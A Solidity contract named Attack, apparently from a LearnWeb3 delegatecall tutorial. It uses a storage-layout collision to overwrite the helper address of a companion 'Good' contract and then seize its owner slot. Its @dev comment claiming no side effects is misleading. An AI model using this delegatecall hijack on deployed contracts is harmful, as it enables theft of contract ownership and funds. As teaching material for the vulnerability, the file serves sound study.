//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Good.sol";

/// @title Contract for https://www.learnweb3.io/tracks/senior/delegate-call
/// @author Olivier Winkler
/// @dev All function calls are currently implemented without side effects
contract Attack {
    address public helper;
    address public owner;
    uint public num;

    Good public good;

    constructor(Good _good) {
        good = Good(_good);
    }

    function setNum(uint _num) public {
        owner = msg.sender;
    }

    function attack() public {
        // This is the way you typecast an address to a uint
        good.setNum(uint(uint160(address(this))));
        good.setNum(1);
    }
}
